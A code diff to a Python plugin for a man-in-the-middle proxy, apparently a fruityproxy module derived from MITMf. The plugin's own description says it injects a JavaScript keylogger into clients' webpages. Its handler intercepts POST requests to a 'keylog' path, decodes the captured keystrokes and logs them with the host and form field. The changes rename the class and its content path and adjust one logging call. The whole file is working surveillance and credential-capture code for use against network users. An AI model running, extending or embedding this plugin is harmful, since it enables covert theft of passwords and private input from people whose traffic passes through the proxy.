@@ -26,10 +26,10 @@ fruityproxy_logger = logging.getLogger("fruityproxy")
 Based on MITMf JSkeyLogger plugin: https://github.com/byt3bl33d3r/MITMf/
 '''
 
-class MSFkeyLogger(Plugin):
-    name = 'MSFkeyLogger'
+class KeyLogger(Plugin):
+    name = 'KeyLogger'
     desc = 'Injects a javascript keylogger into clients webpages'
-    content_path = "./content/MSFkeyLogger/msfkeylogger.js"
+    content_path = "./content/KeyLogger/msfkeylogger.js"
 
     def request(self, flow):
         if flow.request.method == 'POST' and ('keylog' in flow.request.path):
@@ -53,7 +53,7 @@ class MSFkeyLogger(Plugin):
                         try:
                             nice += n.decode('hex')
                         except:
-                            context.log("[JSKeylogger] Error decoding char: {}".format(n))
+                            fruityproxy_logger.debug("["+self.name+"] Error decoding char: {}".format(n))
 
                 fruityproxy_logger.debug("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))
 
